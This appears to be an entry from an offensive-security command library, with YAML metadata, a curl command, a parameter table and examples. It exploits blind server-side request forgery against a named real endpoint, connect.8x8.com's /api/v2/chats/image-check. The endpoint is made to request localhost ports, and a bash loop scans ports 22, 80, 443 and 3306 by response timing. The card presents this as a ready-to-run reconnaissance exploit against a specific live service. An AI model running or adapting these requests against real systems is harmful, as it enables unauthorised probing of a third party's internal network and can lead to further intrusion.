---
data: >-
  curl -X POST https://connect.8x8.com/api/v2/chats/image-check -H
  "Content-Type: application/json" -d '{"url":"http://127.0.0.1:PORT/?a=a.png"}'
tags:
  - ssrf
  - http-request
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T03:46:09.486Z'
id: f16d725e-7206-4e79-8ab4-5b736436a83f
verified: false
validated: true
submitted: true
---
# curl-post-ssrf

## Command

```bash
curl -X POST https://connect.8x8.com/api/v2/chats/image-check \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:PORT/?a=a.png"}'
```

## Description

This command sends a POST request to the vulnerable /api/v2/chats/image-check endpoint in the 8x8 Connect ChatApps module, exploiting Blind SSRF by targeting internal localhost on a specified PORT. It helps probe for open internal ports by observing response timings or errors.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `https://connect.8x8.com/api/v2/chats/image-check` | The target vulnerable endpoint | Yes |
| `-H "Content-Type: application/json"` | Sets the request header for JSON payload | Yes |
| `-d '{"url":"http://127.0.0.1:PORT/?a=a.png"}'` | JSON body with malicious URL; replace PORT with target port (e.g., 22) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://connect.8x8.com/api/v2/chats/image-check \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:22/?a=a.png"}'
```

### Advanced Usage

```bash
# Probe multiple ports in a loop
timeout=5s; for port in {22,80,443,3306}; do echo "Probing port $port"; time curl -X POST https://connect.8x8.com/api/v2/chats/image-check -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:$port/?a=a.png"}' --max-time $timeout; done
```

## Expected Output

A JSON response from the server, such as {"status":"success"} or an error message. For open ports, expect quicker execution (<1s); for closed ports, longer timeouts or connection errors. No direct internal content is returned due to blind nature.

## Related

- [[Related Procedure|procedures/Exploit-Blind-SSRF-for-Internal-Port-Scanning]]
